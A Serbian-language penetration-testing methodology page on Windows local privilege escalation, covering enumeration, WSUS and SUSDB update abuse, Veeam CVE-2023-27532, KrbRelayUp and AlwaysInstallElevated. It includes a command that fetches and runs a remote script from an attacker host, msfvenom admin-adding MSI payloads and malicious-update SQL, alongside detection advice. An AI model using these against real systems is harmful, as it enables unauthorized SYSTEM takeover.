# Eskalacija lokalnih privilegija u Windows-u

{{#include ../../banners/hacktricks-training.md}}

### **Najbolji alat za pronalaženje vektora za eskalaciju lokalnih privilegija u Windows-u:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Ova stranica objedinjuje opštu metodologiju za eskalaciju privilegija u Windows-u iz nekoliko osnovnih vodiča.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Njen praktični tok enumeracije oslanja se i na radionice i kontrolne liste zajednice.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Istorijski materijal o napadima obuhvata prezentaciju sa DerbyCon-a o eskalaciji privilegija u Windows-u.<sup>[[5]](#references)</sup>

## Osnovne postavke Windows-a

### Access Tokens

**Ako ne znate šta su Windows access tokens, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Više informacija o ACLs - DACLs/SACLs/ACEs potražite na sledećoj stranici:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Ako ne znate šta su integrity levels u Windows-u, pročitajte sledeću stranicu pre nego što nastavite:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Bezbednosne kontrole u Windows-u

U Windows-u postoje različiti mehanizmi koji mogu **sprečiti enumeraciju sistema**, pokretanje izvršnih datoteka ili čak **otkriti vaše aktivnosti**. Pre nego što započnete enumeraciju radi eskalacije privilegija, trebalo bi da **pročitate** sledeću **stranicu** i **proverite** sve ove **odbrambene** **mehanizme**:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Fizički pristup takođe može omogućiti da se izmena UEFI NVRAM-a van mreže pretvori u DMA pre pokretanja sistema i lanac izmena memorije Windows `SYSTEM`:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / tiho podizanje privilegija uz UIAccess

UIAccess procesi pokrenuti preko `RAiLaunchAdminProcess` mogu se zloupotrebiti za dostizanje High IL bez upita, kada se zaobiđu provere bezbedne putanje AppInfo. Ovde pogledajte namenski tok rada za zaobilaženje UIAccess/Admin Protection:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Širenje vrednosti registra za pristupačnost u Secure Desktop-u može se zloupotrebiti za proizvoljno pisanje u SYSTEM registar (RegPwn):<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Novije verzije Windows-a uvele su i LPE putanju **SMB arbitrary-port**, pri kojoj se privilegovana lokalna NTLM autentifikacija reflektuje preko ponovo upotrebljene SMB TCP veze:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Informacije o sistemu

Za lokalno prikupljanje podataka iz postojeće PowerShell sesije pogledajte [Windows Enumeration with .NET](../basic-powershell-for-pentesters/dotnet-enumeration.md). Ovi primeri dopunjuju provere u nastavku, bez pokretanja zasebnih izvršnih datoteka za enumeraciju.

### Enumeracija informacija o verziji

Proverite da li postoje poznate ranjivosti u verziji Windows-a (proverite i primenjene zakrpe).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploiti za određene verzije

Ovaj [sajt](https://msrc.microsoft.com/update-guide/vulnerability) je koristan za pretragu detaljnih informacija o Microsoft bezbednosnim ranjivostima. Ova baza podataka sadrži više od 4.700 bezbednosnih ranjivosti, što pokazuje **ogromnu površinu za napad** koju predstavlja Windows okruženje.

**Na sistemu**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas ima ugrađen watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — popisuje verziju OS-a, instalirana ažuriranja i potencijalno relevantne bezbednosne biltene; proverite tačan proizvod i novija ažuriranja koja zamenjuju postojeća pre nego što rezultat smatrate primenljivim.

Za lokalni exploit specifičan za određenu verziju, proverite **arhitekturu pokrenutog procesa**, kao i arhitekturu OS-a. Na 64-bitnom Windowsu, 32-bitni proces podleže [WOW64 preusmeravanju sistema datoteka](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` obično upućuje na 32-bitni sistemski direktorijum, dok `%windir%\Sysnative` tom procesu omogućava pristup izvornom sistemskom direktorijumu. Ovaj alias nije dostupan 64-bitnom procesu. Verzija OS-a ili kandidat za nedostajući KB ne dokazuju da je sistem podložan exploit-u; uporedite pokrenutu verziju, instalirano ili novije zamensko ažuriranje, arhitekturu procesa i preduslove za exploit sa [Microsoft bezbednosnim biltenom](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) za tačan problem.

Primer oštećenja memorije servisa potražite u članku o [offsetima u deljenoj MIDI memoriji koje kontroliše klijent](../../binary-exploitation/array-indexing.md#client-controlled-shared-memory-ring-positions). Objavljeni stack offseti važe samo za testiranu verziju; dobijanje privilegija `LOCAL SERVICE` razlikuje se od kasnijeg koraka [SeImpersonate/EfsPotato](roguepotato-and-printspoofer.md) za prelazak na `SYSTEM`.<sup>[[44]](#references)</sup>

**Lokalno, uz informacije o sistemu**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub repozitorijumi exploit-a:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Okruženje

Da li su u promenljivama okruženja sačuvani neki podaci za prijavu ili drugi korisni podaci?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### Istorija PowerShell-a

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell Transcript datoteke

Možete saznati kako da ovo uključite na [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` je samo primer. [PowerShell transcription policy](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) obično upisuje datoteke u fasciklu Documents svakog korisnika, ali postavka `OutputDirectory` ili `Start-Transcript -OutputDirectory` može da preusmeri datoteke u deljenu ili skrivenu fasciklu. Pre pregleda transkripta proverite efektivnu putanju za izlaz i ACL datoteke: transkript može da sadrži argumente komandi i njihov izlaz, uključujući akreditive. Transkript koji možete da pročitate predstavlja samo trag ako njegov sadržaj otkriva upotrebljiv identitet sa višim privilegijama, a taj identitet može da se prijavi u relevantnom kontekstu.

### PowerShell Module Logging

Beleže se detalji izvršavanja PowerShell pipeline-a, uključujući izvršene komande, pozive komandi i delove skripti. Međutim, možda neće biti zabeleženi svi detalji izvršavanja i rezultati izlaza.

Da biste ovo omogućili, pratite uputstva u odeljku „Transcript files“ u dokumentaciji i izaberite **„Module Logging“** umesto **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Da biste prikazali poslednjih 15 događaja iz PowersShell logova, možete izvršiti:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Beleži se potpuna aktivnost i celokupan sadržaj skripte tokom njenog izvršavanja, čime se obezbeđuje dokumentovanje svakog bloka koda dok se izvršava. Ovaj proces čuva sveobuhvatan revizijski trag svake aktivnosti, koristan za forenziku i analizu zlonamernog ponašanja. Dokumentovanjem svih aktivnosti u trenutku izvršavanja pružaju se detaljni uvidi u proces.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Događaje zapisivanja za Script Block možete pronaći u Pregledaču događaja sistema Windows na putanji: **Evidencije aplikacija i usluga > Microsoft > Windows > PowerShell > Operativno**.\
Da biste prikazali poslednjih 20 događaja, možete da koristite:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Internet podešavanja

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Diskovi

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Ranije smernice su rizik sažele ovako:

Sistem možete kompromitovati ako se ažuriranja ne zahtevaju preko http**S**, već preko http.

WSUS endpoint koji koristi HTTP ukazuje na mogućnost presretanja metapodataka o ažuriranjima i vredi ga dodatno proveriti. Eksploatacija zavisi i od toga da li klijent koristi taj WSUS server, da li napadač može da presretne ili kontroliše njegov saobraćaj i od pravila klijenta za poverenje u ažuriranja i njihovu instalaciju. Sam URL ne omogućava izvršavanje koda. [Microsoft preporučuje TLS za WSUS metapodatke](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Najpre proverite da li mreža koristi WSUS ažuriranja bez SSL-a tako što ćete u cmd pokrenuti sledeće:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Ili sledeće u PowerShell-u:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Ako dobijete odgovor poput nekog od sledećih:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

I ako je `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ili `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` jednako `1`.

Prvobitna izjava o primenljivosti glasila je:

Tada je **moguće iskoristiti ranjivost.** Ako je vrednost poslednje stavke u registru `0`, unos za WSUS biće zanemaren.

Kada je `UseWUServer` postavljen na `1`, Windows Update koristi konfigurisanu intranet uslugu. Time se potvrđuje jedan od preduslova za putanju sa presretanjem HTTP saobraćaja, ali se ne dokazuje da su presretanje, prihvatanje zlonamernog ažuriranja ili instalacija sa povišenim privilegijama mogući. Kada je vrednost `0`, ta konkretna konfigurisana WSUS krajnja tačka nije izabrana tom smernicom.

Da biste iskoristili ove ranjivosti, možete koristiti alate kao što su: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) — ovo su weaponized MiTM exploit skripte za ubacivanje „lažnih“ ažuriranja u WSUS saobraćaj koji ne koristi SSL.

Istraživanje pročitajte ovde:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Kompletan izveštaj pročitajte ovde**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
U osnovi, ovo je propust koji ovaj bug iskorišćava:

> Ako možemo da izmenimo proxy podešavanja lokalnog korisnika, a Windows Updates koristi proxy konfigurisan u podešavanjima programa Internet Explorer, onda možemo lokalno da pokrenemo [PyWSUS](https://github.com/GoSecure/pywsus), presretnemo sopstveni saobraćaj i pokrenemo kod kao korisnik sa povišenim privilegijama na našem sistemu.
>
> Štaviše, pošto WSUS usluga koristi podešavanja trenutnog korisnika, koristiće i njegovo skladište sertifikata. Ako generišemo samopotpisani sertifikat za WSUS ime hosta i dodamo taj sertifikat u skladište sertifikata trenutnog korisnika, moći ćemo da presretnemo i HTTP i HTTPS WSUS saobraćaj. WSUS ne koristi mehanizme slične HSTS-u za uspostavljanje provere sertifikata tipa „trust on first use“. Ako korisnik veruje predstavljenom sertifikatu i on sadrži ispravno ime hosta, usluga će ga prihvatiti.

Ovu ranjivost možete iskoristiti pomoću alata [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (kada bude objavljen).

### Ažuriranja pod kontrolom WSUS administratora

Postoji zasebna putanja kada trenutni identitet može da **objavljuje i odobrava** ažuriranja na WSUS serveru. Proverite efektivno članstvo u grupi `WSUS Administrators` na serveru i sve delegirane WSUS dozvole, a zatim utvrdite koja grupa računara klijenata bi primila odobreno ažuriranje. [Microsoft zahteva privilegije WSUS Administratora za odobravanje ažuriranja](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate), a [dokumentuje i odnos poverenja pri objavljivanju](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): klijenti moraju da veruju sertifikatu za potpisivanje koji se koristi za lokalno objavljen sadržaj. Pre nego što ovo smatrate putanjom za eskalaciju privilegija, potvrdite da je kandidat za ažuriranje potpisan i prihvaćen, da se odnosi na cilj i da se instalira u kontekstu sa višim privilegijama. Sama vrednost `WUServer` preko HTTP-a ili naziv grupe ne potvrđuju ove uslove.

### Zloupotreba prilagođenih ažuriranja u SUSDB: nepotpisani payload-i preko `.txt`/`.esd`

Ovo je drugačiji propust na granici poverenja od presretanja HTTP WSUS veze: preduslov je dovoljan pristup **procedurama baze podataka WSUS-a (`SUSDB`)** za objavljivanje i odobravanje prilagođenog ažuriranja. Jedna praktična početna putanja je prosleđivanje naloga računara WSUS servera ka zasebnom MSSQL serveru na kojem se nalazi `SUSDB`; tačni preduslovi zavise od konkretne implementacije, zato prvo utvrdite `EXECUTE` dozvole, umesto da pretpostavljate da su potrebna SQL administratorska prava.<sup>[[38]](#references)[[39]](#references)</sup>

Za zasebnu putanju napada koja prosleđuje autentifikaciju WSUS klijenta sa HTTP/8530 ka LDAP, SMB или AD CS, погледајте [Злоупотреба WSUS HTTP-а за NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Потврдите external-database relay и procedure дозволе

У имплементацијама у којима WSUS користи спољни SQL Server, најпре проверите да ли налог WSUS сервера може да се аутентификује на бази података и да ли NTLM relay стиже до тог слушача. SQL улога сервера може да омогући процедуре за објављивање ажурирања чак и када је директно писање у табеле забрањено; неуспешан `UPDATE` над `SUSDB` не доказује да је објављивање блокирано. Пре покушаја објављивања прилагођеног ажурирања, у овлашћеној SQL сесији проверите ефективни идентитет, чланство у улогама и дозволе за процедуре.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Definicije procedura uživo i instalirani `SoftwareDistributionPackage.xsd` korisni su pri rekonstrukciji ispravnih metapodataka ažuriranja. Nadređeni bundle i podređeni payload zahtevaju svaki po `UpdateIdentity` (tip fragmenta `1`), `LocalizedProperties` (`4`) i `ExtendedProperties` (`2`); zabeležite lokalni ID revizije koji vraća svaki poziv `spImportUpdate` i održavajte doslednost odnosa bundle-a, sažetaka, veličine, URL-a sadržaja i revizije. Ovo je proces objavljivanja sa stanjem, pa jedan uspešan poziv uskladištene procedure nije dokaz izvršavanja na strani klijenta.<sup>[[38]](#references)</sup>

#### Izgradite, ciljajte i odobrite ažuriranje

Tok rada za prilagođeno ažuriranje koristi legitimne WSUS procedure kao ograničeni API za objavljivanje. Važni prelazi stanja su:<sup>[[38]](#references)</sup>

| Faza | Relevantne uskladištene procedure |
| --- | --- |
| Uvezite metapodatke ažuriranja | `spImportUpdate` |
| Sačuvajte XML fragmente za preduslove, lokalizovana i proširena svojstva | `spSaveXMLFragment` |
| Povežite sažetak sadržaja sa URL-om koji kontroliše napadač | `spSetBatchURL` |
| Izlistajte/kreirajte grupu računara i dodajte klijenta | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Odobrite instalaciju za tu grupu | `spDeployUpdate` sa `@actionID = 0` i `@isAssigned = 1` |

Ime datoteke, sažeci, veličina i rukovalac `CommandLineInstallation` moraju biti usklađeni u uvezenim metapodacima/fragmentima. Nakon dodeljivanja URL-a sadržaja i ciljne grupe, konačno odobrenje izgleda ovako; koristite nove identifikatore ažuriranja, grupe i implementacije, umesto da ponovo koristite GUID-ove iz primera.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Zaobilaženje potpisa zasnovano na ekstenziji

WSUS obično odbacuje proizvoljan nepotpisan izvršni sadržaj. Međutim, u datoteci `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll`, putanja .NET metode `VerifyFile` postavlja zastavicu za proveru sertifikata na false kada se prosleđeno ime datoteke završava sa `.txt` ili `.esd`; `CheckCertificateSignature` se tada preskače, a da se prethodno ne utvrdi da li su bajtovi tekst ili legitimna ESD slika. Zato neizmenjeni PE, nazvan, na primer, `payload.exe.txt`, može da prođe proveru sadržaja, a zatim da ga pokrene rukovalac za instalaciju ažuriranja iz komandne linije. Ovo je greška u politici/konfuzija tipova, a ne falsifikovanje potpisa.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### Postavljanje sadržaja i automatizacija kompatibilni sa BITS-om

Pozivanje funkcije `spDeployUpdate` nalaže WSUS-u da preuzme registrovani sadržaj. Izvor mora da ispuni HTTP očekivanja sistema BITS: sama dostupnost URL-a nije dovoljna jer se pri prenosu koristi početni `HEAD`/`GET` tok i zahtevi za opseg bajtova. Server bez podrške za Range izaziva WSUS događaj sinhronizacije `EventId=364`, koji navodi da BITS zahteva zaglavlje protokola Range.<sup>[[39]](#references)</sup>

Istraživački PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiše SQL potreban za lanac import/fragment/URL/grupa/deployment, uključuje izmenjeni MSSQL klijent za njegovo izvršavanje i sadrži `BitsWebServer.py` za postavljanje sadržaja. Minimalni poziv u ovlašćenom laboratorijskom okruženju je:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Neopsluženo izvršavanje i ponavljanje kao mehanizam postojanosti

Interakcija na strani klijenta zavisi od smernica. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, opcija `4 - Auto download and schedule install`, omogućava da se odobreno ažuriranje preuzme i instalira prema podešenom rasporedu, bez ručnog izbora korisnika. Tokom testiranja, payload čije ažuriranje nije uspelo ili je ostalo nedovršeno odmah je ponovo ponuđen nakon izlaska callback procesa, pa ponašanje pri ponovnom pokušaju može da postane mehanizam postojanosti koji se ponavlja; pritom je upadljivo jer klijent prikazuje stanje neuspelog ažuriranja.<sup>[[39]](#references)</sup>

#### Mogućnosti za detekciju i ojačavanje zaštite

Korisne mogućnosti za analizu na strani servera i klijenta u ovom lancu su:<sup>[[39]](#references)</sup>

- Revidirajte izvršavanje `spCreateTargetGroup`, `spSetBatchURL` i `spDeployUpdate` u `SUSDB`; istražite nove ciljne grupe, spoljne izvore sadržaja, payload-e ažuriranja `.txt`/`.esd` i instalacije koje su izvršili neočekivani principal-i (naročito nalozi koji nisu računari).
- Pregledajte `C:\Program Files\Update Services\LogFiles` u potrazi za `ContentSyncAgent`, `FileVerified`, pogrešno napisanim `FileVerficationFailed` i `EventId=364`; uporedite verifikaciju sa ekstenzijom payloada i stvarnim formatom sadržaja, umesto da verujete sufiksu.
- Tražite ponovljene neuspehe/pokušaje instalacije Windows Update-a, kao i izvršavanje PE datoteka ili neočekivanu aktivnost podređenih procesa/mreže iz sadržaja sa nazivima `.txt` ili `.esd`.
- Zahtevajte Extended Protection for Authentication za servis baze podataka tamo gde je podržan i ograničite mrežni pristup bazi podataka na WSUS server i ovlašćene administrativne sisteme. Svedite `EXECUTE` dozvole za procedure prilagođenih ažuriranja na minimum i revidirajte ih.

## Alatke za automatsko ažuriranje trećih strana i IPC agenta (lokalni privesc)

Mnogi poslovni agenti izlažu IPC površinu na localhost-u i privilegovani kanal za ažuriranje. Ako se registracija može usmeriti na server napadača, a alatka za ažuriranje veruje lažnom root CA sertifikatu ili koristi slabe provere potpisnika, lokalni korisnik može da isporuči zlonamerni MSI koji instalira SYSTEM servis. Ovde pogledajte uopštenu tehniku (zasnovanu na lancu Netskope stAgentSvc – CVE-2025-0309):


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM preko TCP 9401)

Originalni opis za određenu verziju i napomena o izviđanju glasili su:

Veeam B&R < `11.0.1.1261` izlaže localhost servis na **TCP/9401** koji obrađuje poruke pod kontrolom napadača, omogućavajući izvršavanje proizvoljnih komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup>

- **Izviđanje**: potvrdite da port sluša i proverite verziju, npr. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication i Cloud Connect podrazumevano koriste osnovni servis za rezervne kopije na **TCP/9401**. [Veeam-ovo bezbednosno obaveštenje](https://www.veeam.com/kb4424) opisuje neautentifikovano otkrivanje šifrovanih akreditiva baze konfiguracije unutar mrežnog perimetra rezervnih kopija; zaseban javni PoC demonstrira putanju za izvršavanje komandi kao **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Servis može da se poveže i na interfejse koji nisu localhost, pa proverite njegovu stvarnu adresu i PID.

- **Izviđanje**: potvrdite da TCP/9401 koristi `Veeam.Backup.Service.exe`, a zatim proverite instalirani proizvod i metapodatke zakrpa. `netstat -ano | findstr 9401` i `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` jesu indikatori, ali nisu potpuna provera zakrpa.
- **Prve ispravljene verzije**: Veeam navodi **11a build 11.0.1.1261 P20230227** i **12 build 12.0.0.1420 P20230223** kao prva ispravljena izdanja; prethodna izdanja su ranjiva. Sam četvorodelni broj verzije datoteke ne može da razlikuje nezakrpljeni osnovni build od kasnije zakrpe na istom broju build-a. Pre nego što proglasite granični build ispravljenim, proverite identifikator zakrpe u [istoriji build-ova proizvođača](https://www.veeam.com/kb2680).
- **Eksploatacija**: smestite PoC, kao što je `VeeamHax.exe`, zajedno sa potrebnim Veeam DLL-ovima u isti direktorijum, a zatim pokrenite SYSTEM payload preko lokalnog soketa:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Servis izvršava komandu kao SYSTEM.

Navedeni PoC prikazuje izvršavanje komandi kao SYSTEM kada su ispunjeni dodatni preduslovi; savetodavno obaveštenje proizvođača opisuje problem otkrivanja akreditiva.

## KrbRelayUp

Originalni opis podrazumevanog okruženja glasio je:

U Windows okruženjima **domena**, pod određenim uslovima, postoji ranjivost **local privilege escalation**. Ti uslovi obuhvataju okruženja u kojima **LDAP signing nije nametnut,** korisnici imaju sopstvena prava koja im omogućavaju da konfigurišu **Resource-Based Constrained Delegation (RBCD)** i mogu da kreiraju računare u domenu. Važno je napomenuti da su ovi **zahtevi** ispunjeni uz **podrazumevana podešavanja**.

Lokalni Kerberos relay može da omogući prelaz sa prijave sa manjim privilegijama na privilegovano upisivanje u direktorijum, kada se odgovarajući COM server autentifikuje, a relayed principal ima prava nad ciljnim objektom. [KrbRelay dokumentuje](https://github.com/cube0x0/KrbRelay) i RBCD i LDAP upisivanja u `msDS-KeyCredentialLink` (shadow-credential); KrbRelayUp automatizuje neke od tih putanja. RBCD lanac zahteva odgovarajuća prava za delegiranje i nad ciljnim objektom, dok shadow-credential lanac zahteva prava za upisivanje ključeva i KDC koji podržava putanju autentifikacije sertifikatom. Nijedna od tih putanja ne proizlazi samo iz članstva u domenu.

Proverite smernice stvarnog DC-a za [LDAP signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) i [LDAPS channel-binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), ACL objekta identiteta koji se relay-uje i nivoe autentifikacije i impersonation odabrane COM klase. Bitni su tip prijave i kontekst akreditiva pozivaoca: WinRM sesija može da se ponaša drugačije od interaktivne prijave ili prijave sa novim akreditivima. I firewall/OXID rutiranje i instalirana ažuriranja mogu da promene rezultat. Permisivnu smernicu ili odgovarajući ACL tretirajte kao stavku za proveru; pasivno nabrajanje ne bi trebalo da pokreće COM coercion, relay autentifikaciju ili upisivanja u direktorijum. Shadow credential računarskog naloga može da dovede do mašinskog tiketa, a samo ako taj nalog ima potrebna prava za replikaciju direktorijuma, i do zasebne DCSync putanje.

Pronađite **exploit u** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Za više informacija o toku napada pogledajte [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup>

## AlwaysInstallElevated

**Ako** su ova 2 registra **omogućena** (vrednost je **0x1**), korisnici sa bilo kojim nivoom privilegija mogu da **instaliraju** (izvršavaju) `*.msi` datoteke kao NT AUTHORITY\\**SYSTEM**.

```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### Metasploit payloads

```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```

Ako imate meterpreter sesiju, ovu tehniku možete automatizovati pomoću modula **`exploit/windows/local/always_install_elevated`**

### PowerUP

Pomoću komande `Write-UserAddMSI` iz power-up-a napravite Windows MSI binarnu datoteku u trenutnom direktorijumu radi eskalacije privilegija. Ova skripta ispisuje unapred kompajlirani MSI instalacioni program koji traži dodavanje korisnika/grupe (zato će vam biti potreban GIU pristup):

```
Write-UserAddMSI
```

Samo pokrenite kreirani binarni fajl da biste eskalirali privilegije.

